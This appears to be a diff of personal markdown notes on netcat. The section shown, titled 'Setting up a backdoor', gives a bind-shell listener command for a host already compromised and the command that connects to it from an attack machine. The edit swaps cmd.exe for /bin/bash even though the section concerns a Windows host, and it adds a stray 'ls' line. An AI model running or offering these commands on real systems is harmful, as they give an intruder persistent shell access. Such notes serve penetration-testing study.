@@ -40,11 +40,12 @@ on the local host:
 ### Setting up a backdoor
 You have compromised a Windows host and you wish to establish a backdoor that you will be able to connect to from your BackTrack attack machine.
 on the compromised windows host:
-`# nc -l -p 80 -d -e cmd.exe -L`
+`# nc -l -p 80 -d -e /bin/bash`
 on the local host:
 `# nc [remote host] 80`
+`ls`
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIwMzM4MjkyMywtMzE3NDAxNDgxLDU3OD
-U5Mzg0MiwxMTk5MjUzOTcwLDk0NjAyMjMyMywxMzcyOTg2MjAw
-XX0=
+eyJoaXN0b3J5IjpbLTE4ODM5NTUyMjIsLTIwMzM4MjkyMywtMz
+E3NDAxNDgxLDU3ODU5Mzg0MiwxMTk5MjUzOTcwLDk0NjAyMjMy
+MywxMzcyOTg2MjAwXX0=
 -->
